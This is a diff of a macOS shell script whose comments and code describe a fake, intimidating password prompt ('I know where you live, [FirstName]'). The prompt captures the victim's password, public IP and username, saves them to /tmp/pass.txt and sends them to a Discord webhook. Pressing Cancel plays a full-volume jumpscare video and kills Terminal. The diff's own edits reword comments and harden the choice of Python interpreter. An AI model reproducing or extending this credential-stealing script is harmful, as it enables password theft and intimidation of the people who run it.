@@ -4,16 +4,15 @@
 # - Displays a login prompt with two lines:
 #     "I know where you live, [FirstName]."
 #     "Enter your password Mr. [LastName]. DO NOT PRESS CANCEL"
-# - If the user enters a non-empty password, it sends the data (password, public IP, username)
+# - If a non-empty password is entered, the script sends the data (password, public IP, username)
 #   to a Discord webhook.
-# - If the user presses Cancel, it triggers a jumpscare:
-#     It downloads an MP4 video from your GitHub repository,
-#     creates a temporary HTML file that embeds the video,
-#     sets system volume to maximum, opens it in the default browser in full screen,
-#     then forcefully kills Terminal.
+# - If the user presses Cancel (i.e. if the dialog is cancelled), the jumpscare branch is triggered:
+#     It creates a temporary HTML file that embeds a jumpscare video from GitHub,
+#     sets system volume to maximum, opens the HTML file in the default browser in full screen,
+#     and then forcefully kills Terminal.
 #
 # Requirements:
-#   - macOS with osascript, curl, and either python3 or python installed.
+#   - macOS with osascript, curl, and either Python 3 or Python 2 installed.
 #
 # Usage:
 #   chmod +x combined_script.sh
@@ -32,7 +31,8 @@ capture="username=${username}\n____________________________________________\n\n"
 # The prompt displays:
 #   Line 1: "I know where you live, [FirstName]."
 #   Line 2: "Enter your password Mr. [LastName]. DO NOT PRESS CANCEL"
-# It will re-prompt if the input is empty, but if the user cancels, it returns "CANCEL".
+# It repeats until the user enters a non-empty value.
+# If the user cancels, it returns "CANCEL".
 read -r -d '' applescriptCode <<'EOF'
 set fullName to (long user name of (system info))
 set firstName to word 1 of fullName
@@ -129,11 +129,14 @@ else
     # --- Save Data to Temporary File ---
     echo -e "$capture" > /tmp/pass.txt
     
-    # --- Determine Python Interpreter (Prefer python3) ---
-    if command -v python3 &>/dev/null; then
+    # --- Determine Which Python Interpreter to Use (Prefer Python 3, then Python 2) ---
+    if command -v python3 >/dev/null 2>&1; then
         PYTHON=python3
-    else
+    elif command -v python >/dev/null 2>&1; then
         PYTHON=python
+    else
+        echo "Error: Neither python3 nor python is installed. Exiting."
+        exit 1
     fi
     
     # --- Generate JSON Payload ---
